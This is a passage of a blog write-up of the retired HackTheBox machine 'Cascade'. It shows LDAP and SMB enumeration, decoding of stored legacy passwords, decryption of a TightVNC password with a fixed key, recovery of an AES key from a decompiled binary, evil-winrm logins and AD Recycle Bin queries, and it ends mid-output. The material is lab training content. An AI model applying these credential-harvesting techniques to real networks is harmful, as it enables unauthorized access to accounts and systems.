@@ -1,0 +1,968 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Cascade | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/07/htb-cascade.html" title="Read more" class="entry-title-link">
+                HTB: Cascade</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-07-26T09:30:00+02:00">26 Jul 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
+          <a href="../../tag/ldap.html" title="Read more with the label LDAP" class="meta-link">LDAP</a> 
+          <a href="../../tag/vnc.html" title="Read more with the label VNC" class="meta-link">VNC</a> 
+          <a href="../../tag/ad-recycle-bin.html" title="Read more with the label AD Recycle bin" class="meta-link">AD Recycle bin</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 10 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.07/cascade_card.png" alt="Cascade Card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/235">Cascade</a> publish on
+Mars 28 2020 by
+<a href="https://www.hackthebox.eu/home/users/profile/158833">VbScrub</a>.
+This box is rated as medium box. It implies some LDAP search, some SMB shares,
+a VNC registry, some reverse engineering and the AD Recycle Bin.</p>
+
+
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">nmap</h2>
+<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
+run a simple nmap scan:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Apr 10 05:54:33 2020 as: nmap -p- -sSV -oN nmap 10.10.10.182</span>
+<span class="code-line">Nmap scan report for 10.10.10.182</span>
+<span class="code-line">Host is up (0.084s latency).</span>
+<span class="code-line">Not shown: 65520 filtered ports</span>
+<span class="code-line">PORT      STATE SERVICE       VERSION</span>
+<span class="code-line">53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span>
+<span class="code-line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-10 09:59:25Z)</span>
+<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="code-line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">445/tcp   open  microsoft-ds?</span>
+<span class="code-line">636/tcp   open  tcpwrapped</span>
+<span class="code-line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">3269/tcp  open  tcpwrapped</span>
+<span class="code-line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">49154/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49155/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">49158/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">49165/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Fri Apr 10 05:57:39 2020 -- 1 IP address (1 host up) scanned in 185.33 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>As always with Windows box there is a lot of open ports and services.
+We try to enumerate a few of them and run
+<a href="https://github.com/portcullislabs/enum4linux">enum4linux</a>.</p>
+<h2 id="ldap">LDAP</h2>
+<p>The interesting service is the LDAP. When enumerating and reading the result we
+discover that the <code>r.thompson</code> account as a filed <code>cascadeLegacyPwd</code> containing
+some base64 data.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ldapsearch -h 10.10.10.182 -p 389 -x -b &quot;dc=cascade,dc=local&quot;</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"># Ryan Thompson, Users, UK, cascade.local</span>
+<span class="code-line">dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local</span>
+<span class="code-line">objectClass: top</span>
+<span class="code-line">objectClass: person</span>
+<span class="code-line">objectClass: organizationalPerson</span>
+<span class="code-line">objectClass: user</span>
+<span class="code-line">cn: Ryan Thompson</span>
+<span class="code-line">sn: Thompson</span>
+<span class="code-line">givenName: Ryan</span>
+<span class="code-line">distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local</span>
+<span class="code-line">instanceType: 4</span>
+<span class="code-line">whenCreated: 20200109193126.0Z</span>
+<span class="code-line">whenChanged: 20200323112031.0Z</span>
+<span class="code-line">displayName: Ryan Thompson</span>
+<span class="code-line">uSNCreated: 24610</span>
+<span class="code-line">memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local</span>
+<span class="code-line">uSNChanged: 295010</span>
+<span class="code-line">name: Ryan Thompson</span>
+<span class="code-line">objectGUID:: LfpD6qngUkupEy9bFXBBjA==</span>
+<span class="code-line">userAccountControl: 66048</span>
+<span class="code-line">badPwdCount: 1</span>
+<span class="code-line">codePage: 0</span>
+<span class="code-line">countryCode: 0</span>
+<span class="code-line">badPasswordTime: 132309997863352844</span>
+<span class="code-line">lastLogoff: 0</span>
+<span class="code-line">lastLogon: 132247339125713230</span>
+<span class="code-line">pwdLastSet: 132230718862636251</span>
+<span class="code-line">primaryGroupID: 513</span>
+<span class="code-line">objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==</span>
+<span class="code-line">accountExpires: 9223372036854775807</span>
+<span class="code-line">logonCount: 2</span>
+<span class="code-line">sAMAccountName: r.thompson</span>
+<span class="code-line">sAMAccountType: 805306368</span>
+<span class="code-line">userPrincipalName: r.thompson@cascade.local</span>
+<span class="code-line">objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local</span>
+<span class="code-line">dSCorePropagationData: 20200126183918.0Z</span>
+<span class="code-line">dSCorePropagationData: 20200119174753.0Z</span>
+<span class="code-line">dSCorePropagationData: 20200119174719.0Z</span>
+<span class="code-line">dSCorePropagationData: 20200119174508.0Z</span>
+<span class="code-line">dSCorePropagationData: 16010101000000.0Z</span>
+<span class="code-line">lastLogonTimestamp: 132294360317419816</span>
+<span class="code-line">msDS-SupportedEncryptionTypes: 0</span>
+<span class="code-line">cascadeLegacyPwd: clk0bjVldmE=</span>
+<span class="code-line"></code></pre></div>
+
+<p>We decode it and found the password <code>rY4n5eva</code> for the <code>r.thompson</code> account.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$  echo -ne &#39;clk0bjVldmE=&#39; | base64 -d</span>
+<span class="code-line">rY4n5eva</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="smb-share">SMB share</h2>
+<p>Using this account we can enumerate the available SMB shares.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$  smbclient -L \\\\10.10.10.182 -U &#39;r.thompson&#39;</span>
+<span class="code-line">Unable to initialize messaging context</span>
+<span class="code-line">Enter WORKGROUP\r.thompson&#39;s password:</span>
+<span class="code-line"></span>
+<span class="code-line">        Sharename       Type      Comment</span>
+<span class="code-line">        ---------       ----      -------</span>
+<span class="code-line">        ADMIN$          Disk      Remote Admin</span>
+<span class="code-line">        Audit$          Disk</span>
+<span class="code-line">        C$              Disk      Default share</span>
+<span class="code-line">        Data            Disk</span>
+<span class="code-line">        IPC$            IPC       Remote IPC</span>
+<span class="code-line">        NETLOGON        Disk      Logon server share</span>
+<span class="code-line">        print$          Disk      Printer Drivers</span>
+<span class="code-line">        SYSVOL          Disk      Logon server share</span>
+<span class="code-line">SMB1 disabled -- no workgroup available</span>
+<span class="code-line"></code></pre></div>
+
+<p>We mount the <code>Data</code> share using our account and list its content, the file <code>VNC
+Install.reg</code> inside <code>s.smith</code> folder seems interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$  sudo mount //10.10.10.182/Data /mnt/ -o username=r.thompson</span>
+<span class="code-line">tree /mnt/</span>
+<span class="code-line">/mnt/</span>
+<span class="code-line">├── Contractors</span>
+<span class="code-line">├── Finance</span>
+<span class="code-line">├── IT</span>
+<span class="code-line">│   ├── Email Archives</span>
+<span class="code-line">│   │   └── Meeting_Notes_June_2018.html</span>
+<span class="code-line">│   ├── LogonAudit</span>
+<span class="code-line">│   ├── Logs</span>
+<span class="code-line">│   │   ├── Ark AD Recycle Bin</span>
+<span class="code-line">│   │   │   └── ArkAdRecycleBin.log</span>
+<span class="code-line">│   │   └── DCs</span>
+<span class="code-line">│   │       └── dcdiag.log</span>
+<span class="code-line">│   └── Temp</span>
+<span class="code-line">│       ├── r.thompson</span>
+<span class="code-line">│       └── s.smith</span>
+<span class="code-line">│           └── VNC Install.reg</span>
+<span class="code-line">├── Production</span>
+<span class="code-line">└── Temps</span>
+<span class="code-line"></span>
+<span class="code-line">13 directories, 4 files</span>
+<span class="code-line"></code></pre></div>
+
+<p>This <code>VNC Install.reg</code> file inside <code>s.smith</code> folder is the Windows Registry of a VNC installation. The
+<code>Password</code> entry is really interesting.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ cat /mnt/IT/Temp/s.smith/VNC\ Install.reg</span>
+<span class="code-line">��Windows Registry Editor Version 5.00</span>
+<span class="code-line"></span>
+<span class="code-line">[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]</span>
+<span class="code-line"></span>
+<span class="code-line">[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]</span>
+<span class="code-line">&quot;ExtraPorts&quot;=&quot;&quot;</span>
+<span class="code-line">&quot;QueryTimeout&quot;=dword:0000001e</span>
+<span class="code-line">&quot;QueryAcceptOnTimeout&quot;=dword:00000000</span>
+<span class="code-line">&quot;LocalInputPriorityTimeout&quot;=dword:00000003</span>
+<span class="code-line">&quot;LocalInputPriority&quot;=dword:00000000</span>
+<span class="code-line">&quot;BlockRemoteInput&quot;=dword:00000000</span>
+<span class="code-line">&quot;BlockLocalInput&quot;=dword:00000000</span>
+<span class="code-line">&quot;IpAccessControl&quot;=&quot;&quot;</span>
+<span class="code-line">&quot;RfbPort&quot;=dword:0000170c</span>
+<span class="code-line">&quot;HttpPort&quot;=dword:000016a8</span>
+<span class="code-line">&quot;DisconnectAction&quot;=dword:00000000</span>
+<span class="code-line">&quot;AcceptRfbConnections&quot;=dword:00000001</span>
+<span class="code-line">&quot;UseVncAuthentication&quot;=dword:00000001</span>
+<span class="code-line">&quot;UseControlAuthentication&quot;=dword:00000000</span>
+<span class="code-line">&quot;RepeatControlAuthentication&quot;=dword:00000000</span>
+<span class="code-line">&quot;LoopbackOnly&quot;=dword:00000000</span>
+<span class="code-line">&quot;AcceptHttpConnections&quot;=dword:00000001</span>
+<span class="code-line">&quot;LogLevel&quot;=dword:00000000</span>
+<span class="code-line">&quot;EnableFileTransfers&quot;=dword:00000001</span>
+<span class="code-line">&quot;RemoveWallpaper&quot;=dword:00000001</span>
+<span class="code-line">&quot;UseD3D&quot;=dword:00000001</span>
+<span class="code-line">&quot;UseMirrorDriver&quot;=dword:00000001</span>
+<span class="code-line">&quot;EnableUrlParams&quot;=dword:00000001</span>
+<span class="code-line">&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f</span>
+<span class="code-line">&quot;AlwaysShared&quot;=dword:00000000</span>
+<span class="code-line">&quot;NeverShared&quot;=dword:00000000</span>
+<span class="code-line">&quot;DisconnectClients&quot;=dword:00000001</span>
+<span class="code-line">&quot;PollingInterval&quot;=dword:000003e8</span>
+<span class="code-line">&quot;AllowLoopback&quot;=dword:00000000</span>
+<span class="code-line">&quot;VideoRecognitionInterval&quot;=dword:00000bb8</span>
+<span class="code-line">&quot;GrabTransparentWindows&quot;=dword:00000001</span>
+<span class="code-line">&quot;SaveLogToAllUsersPath&quot;=dword:00000000</span>
+<span class="code-line">&quot;RunControlInterface&quot;=dword:00000001</span>
+<span class="code-line">&quot;IdleTimeout&quot;=dword:00000000</span>
+<span class="code-line">&quot;VideoClasses&quot;=&quot;&quot;</span>
+<span class="code-line">&quot;VideoRects&quot;=&quot;&quot;</span>
+<span class="code-line"></code></pre></div>
+
+<p>A few Google search lead us to <a href="https://github.com/frizb/PasswordDecrypts">github repository explaining how to decrypt the
+password</a> using the Interactive Ruby
+Shell from metasploit.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ msfconsole</span>
+<span class="code-line">msf5 &gt; irb</span>
+<span class="code-line">[*] Starting IRB shell...</span>
+<span class="code-line">[*] You are in the &quot;framework&quot; object</span>
+<span class="code-line"></span>
+<span class="code-line">irb: warn: can&#39;t alias jobs from irb_jobs.</span>
+<span class="code-line">&gt;&gt; fixedkey = &quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&quot;</span>
+<span class="code-line">=&gt; &quot;\u0017Rk\u0006#NX\a&quot;</span>
+<span class="code-line">&gt;&gt; require &#39;rex/proto/rfb&#39;</span>
+<span class="code-line">=&gt; true</span>
+<span class="code-line">&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&quot;6BCF2A4B6E5ACA0F&quot;].pack(&#39;H*&#39;), fixedkey</span>
+<span class="code-line">=&gt; &quot;sT333ve2&quot;</span>
+<span class="code-line"></code></pre></div>
+
+<p>With this account we can connect to the box using
+<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>. We quickly found the
+user flag inside on our user Desktop.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\s.smith\Documents&gt; type &quot;C:\Users\s.smith\Desktop\user.txt&quot;</span>
+<span class="code-line">6c624e1637cf604fec1cda8de1ad0779</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting root</h1>
+<p>We try to mount some other share with our <code>s.smith</code> account. <code>Audit</code> is interesting as
+there is a executable binary <code>CascAudit.exe</code>, a DLL <code>CascCrypto.dll</code>, and a
+SQLite Database <code>Audit.db</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ sudo mount //10.10.10.182/Audit$ /mnt/ -o username=s.smith</span>
+<span class="code-line">Password for s.smith@//10.10.10.182/Audit$:  ********</span>
+<span class="code-line">kali@kali:~$ tree /mnt/</span>
+<span class="code-line">/mnt/</span>
+<span class="code-line">├── CascAudit.exe</span>
+<span class="code-line">├── CascCrypto.dll</span>
+<span class="code-line">├── DB</span>
+<span class="code-line">│   └── Audit.db</span>
+<span class="code-line">├── RunAudit.bat</span>
+<span class="code-line">├── System.Data.SQLite.dll</span>
+<span class="code-line">├── System.Data.SQLite.EF6.dll</span>
+<span class="code-line">├── x64</span>
+<span class="code-line">│   └── SQLite.Interop.dll</span>
+<span class="code-line">└── x86</span>
+<span class="code-line">    └── SQLite.Interop.dll</span>
+<span class="code-line"></span>
+<span class="code-line">3 directories, 8 files</span>
+<span class="code-line"></code></pre></div>
+
+<p>We load the executable in <a href="https://github.com/0xd4d/dnSpy">DNSpy</a> and look at
+the code. We saw a function that use the Crypto DLL to decrypt a text providing
+from the database using the key <code>c4scadek3y654321</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>using (SQLiteConnection sqliteConnection = new SQLiteConnection(&quot;Data Source=&quot; + MyProject.Application.CommandLineArgs[0] + &quot;;Version=3;&quot;))</span>
+<span class="code-line">{</span>
+<span class="code-line">  string str = string.Empty;</span>
+<span class="code-line">  string password = string.Empty;</span>
+<span class="code-line">  string str2 = string.Empty;</span>
+<span class="code-line">  try</span>
+<span class="code-line">  {</span>
+<span class="code-line">    sqliteConnection.Open();</span>
+<span class="code-line">    using (SQLiteCommand sqliteCommand = new SQLiteCommand(&quot;SELECT * FROM LDAP&quot;, sqliteConnection))</span>
+<span class="code-line">    {</span>
+<span class="code-line">      using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())</span>
+<span class="code-line">      {</span>
+<span class="code-line">        sqliteDataReader.Read();</span>
+<span class="code-line">        str = Conversions.ToString(sqliteDataReader[&quot;Uname&quot;]);</span>
+<span class="code-line">        str2 = Conversions.ToString(sqliteDataReader[&quot;Domain&quot;]);</span>
+<span class="code-line">        string text = Conversions.ToString(sqliteDataReader[&quot;Pwd&quot;]);</span>
+<span class="code-line">        try</span>
+<span class="code-line">        {</span>
+<span class="code-line">          password = Crypto.DecryptString(text, &quot;c4scadek3y654321&quot;);</span>
+<span class="code-line">        }</span>
+<span class="code-line">        catch (Exception ex)</span>
+<span class="code-line">        {</span>
+<span class="code-line">          Console.WriteLine(&quot;Error decrypting password: &quot; + ex.Message);</span>
+<span class="code-line">          return;</span>
+<span class="code-line">        }</span>
+<span class="code-line">      }</span>
+<span class="code-line">    }</span>
+<span class="code-line">    sqliteConnection.Close();</span>
+<span class="code-line">  }</span>
+<span class="code-line"></code></pre></div>
+
+<p>We repeat the SQL request using <code>sqlite3</code> and got some base64 data for the
+user <code>ArkSvc</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/pown/htb_cascade$ sqlite3 Audit.db</span>
+<span class="code-line">SQLite version 3.31.0 2019-12-29 00:52:41</span>
+<span class="code-line">Enter &quot;.help&quot; for usage hints.</span>
+<span class="code-line">sqlite&gt; SELECT * FROM LDAP;</span>
+<span class="code-line">1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local</span>
+<span class="code-line"></code></pre></div>
+
+<p>We look at the crypto code in the DLL (still using <a href="https://github.com/0xd4d/dnSpy">DNSpy</a>).
+This is a simple AES using a fix IV and the key passed in parameter by the
+executable binary.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>// Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760</span>
+<span class="code-line">public static string DecryptString(string EncryptedString, string Key)</span>
+<span class="code-line">{</span>
+<span class="code-line">  byte[] array = Convert.FromBase64String(EncryptedString);</span>
+<span class="code-line">  Aes aes = Aes.Create();</span>
+<span class="code-line">  aes.KeySize = 128;</span>
+<span class="code-line">  aes.BlockSize = 128;</span>
+<span class="code-line">  aes.IV = Encoding.UTF8.GetBytes(&quot;1tdyjCbY1Ix49842&quot;);</span>
+<span class="code-line">  aes.Mode = CipherMode.CBC;</span>
+<span class="code-line">  aes.Key = Encoding.UTF8.GetBytes(Key);</span>
+<span class="code-line">  string @string;</span>
+<span class="code-line">  using (MemoryStream memoryStream = new MemoryStream(array))</span>
+<span class="code-line">  {</span>
+<span class="code-line">    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))</span>
+<span class="code-line">    {</span>
+<span class="code-line">      byte[] array2 = new byte[checked(array.Length - 1 + 1)];</span>
+<span class="code-line">      cryptoStream.Read(array2, 0, array2.Length);</span>
+<span class="code-line">      @string = Encoding.UTF8.GetString(array2);</span>
+<span class="code-line">    }</span>
+<span class="code-line">  }</span>
+<span class="code-line">  return @string;</span>
+<span class="code-line">}</span>
+<span class="code-line"></code></pre></div>
+
+<p>Here is the <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09">CyberChef recipe</a> to decode the password: <code>w3lc0meFr31nd</code>.</p>
+<p>From there we can can connect with the <code>ArkSvc</code> account using
+<a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> and enumerate our
+permissions.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\arksvc\Documents&gt; whoami /all</span>
+<span class="code-line"></span>
+<span class="code-line">USER INFORMATION</span>
+<span class="code-line">----------------</span>
+<span class="code-line"></span>
+<span class="code-line">User Name      SID</span>
+<span class="code-line">============== ==============================================</span>
+<span class="code-line">cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">GROUP INFORMATION</span>
+<span class="code-line">-----------------</span>
+<span class="code-line"></span>
+<span class="code-line">Group Name</span>
+<span class="code-line">===========================================</span>
+<span class="code-line">Everyone</span>
+<span class="code-line">BUILTIN\Users</span>
+<span class="code-line">BUILTIN\Pre-Windows 2000 Compatible Access</span>
+<span class="code-line">NT AUTHORITY\NETWORK</span>
+<span class="code-line">NT AUTHORITY\Authenticated Users</span>
+<span class="code-line">NT AUTHORITY\This Organization</span>
+<span class="code-line">CASCADE\Data Share</span>
+<span class="code-line">CASCADE\IT</span>
+<span class="code-line">CASCADE\AD Recycle Bin</span>
+<span class="code-line">CASCADE\Remote Management Users</span>
+<span class="code-line">NT AUTHORITY\NTLM Authentication</span>
+<span class="code-line">Mandatory Label\Medium Plus Mandatory Level</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">PRIVILEGES INFORMATION</span>
+<span class="code-line">----------------------</span>
+<span class="code-line"></span>
+<span class="code-line">Privilege Name                Description                    State</span>
+<span class="code-line">============================= ============================== =======</span>
+<span class="code-line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
+<span class="code-line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
+<span class="code-line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
+<span class="code-line"></code></pre></div>
+
+<p>We are in the group <code>AD Recycle Bin</code>. A few Google research lead us to
+<a href="https://docs.microsoft.com/en-us/archive/blogs/askds/the-ad-recycle-bin-understanding-implementing-best-practices-and-troubleshooting">a Microsoft article about AD recycle bin</a>.</p>
+<p>We execute the Powershell command to list the deleted objects and see some
+<code>cascadeLegacyPwd</code> filed for the user <code>TempAdmin</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Desktop&gt;  Get-ADObject -filter &#39;isdeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#39; -includeDeletedObjects -property *</span>
+<span class="code-line"></span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line"></span>
+<span class="code-line">CanonicalName                   : cascade.local/Deleted Objects/User</span>
+<span class="code-line">                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88</span>
+<span class="code-line">CN                              : User</span>
+<span class="code-line">                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88</span>
+<span class="code-line">Created                         : 1/26/2020 2:34:31 AM</span>
+<span class="code-line">createTimeStamp                 : 1/26/2020 2:34:31 AM</span>
+<span class="code-line">Deleted                         : True</span>
+<span class="code-line">Description                     :</span>
+<span class="code-line">DisplayName                     :</span>
+<span class="code-line">DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local</span>
+<span class="code-line">dSCorePropagationData           : {1/1/1601 12:00:00 AM}</span>
+<span class="code-line">instanceType                    : 4</span>
+<span class="code-line">isDeleted                       : True</span>
+<span class="code-line">LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local</span>
+<span class="code-line">Modified                        : 1/26/2020 2:40:52 AM</span>
+<span class="code-line">modifyTimeStamp                 : 1/26/2020 2:40:52 AM</span>
+<span class="code-line">msDS-LastKnownRDN               : User</span>
+<span class="code-line">Name                            : User</span>
+<span class="code-line">                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88</span>
+<span class="code-line">nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity</span>
+<span class="code-line">ObjectCategory                  :</span>
+<span class="code-line">ObjectClass                     : container</span>
+<span class="code-line">ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88</span>
+<span class="code-line">ProtectedFromAccidentalDeletion : False</span>
+<span class="code-line">sDRightsEffective               : 0</span>
+<span class="code-line">showInAdvancedViewOnly          : True</span>
+<span class="code-line">uSNChanged                      : 196700</span>
+<span class="code-line">uSNCreated                      : 196690</span>
+<span class="code-line">whenChanged                     : 1/26/2020 2:40:52 AM</span>
+<span class="code-line">whenCreated                     : 1/26/2020 2:34:31 AM</span>
+<span class="code-line"></span>
+<span class="code-line">accountExpires                  : 9223372036854775807</span>
+<span class="code-line">badPasswordTime                 : 0</span>
+<span class="code-line">badPwdCount                     : 0</span>
+<span class="code-line">CanonicalName                   : cascade.local/Deleted Objects/TempAdmin</span>
+<span class="code-line">                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span>
+<span class="code-line">cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</span>
+<span class="code-line">CN                              : TempAdmin</span>
+<span class="code-line">                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span>
+<span class="code-line">codePage                        : 0</span>
+<span class="code-line">countryCode                     : 0</span>
+<span class="code-line">Created                         : 1/27/2020 3:23:08 AM</span>
+<span class="code-line">createTimeStamp                 : 1/27/2020 3:23:08 AM</span>
+<span class="code-line">Deleted                         : True</span>
+<span class="code-line">Description                     :</span>
+<span class="code-line">DisplayName                     : TempAdmin</span>
+<span class="code-line">DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local</span>
+<span class="code-line">dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}</span>
+<span class="code-line">givenName                       : TempAdmin</span>
+<span class="code-line">instanceType                    : 4</span>
+<span class="code-line">isDeleted                       : True</span>
+<span class="code-line">LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local</span>
+<span class="code-line">lastLogoff                      : 0</span>
+<span class="code-line">lastLogon                       : 0</span>
+<span class="code-line">logonCount                      : 0</span>
+<span class="code-line">Modified                        : 1/27/2020 3:24:34 AM</span>
+<span class="code-line">modifyTimeStamp                 : 1/27/2020 3:24:34 AM</span>
+<span class="code-line">msDS-LastKnownRDN               : TempAdmin</span>
+<span class="code-line">Name                            : TempAdmin</span>
+<span class="code-line">                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059</span>
+<span class="code-line">nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity</span>
+<span class="code-line">ObjectCategory                  :</span>
+<span class="code-line">ObjectClass                     : user</span>
+<span class="code-line">ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059</span>
+<span class="code-line">objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136</span>
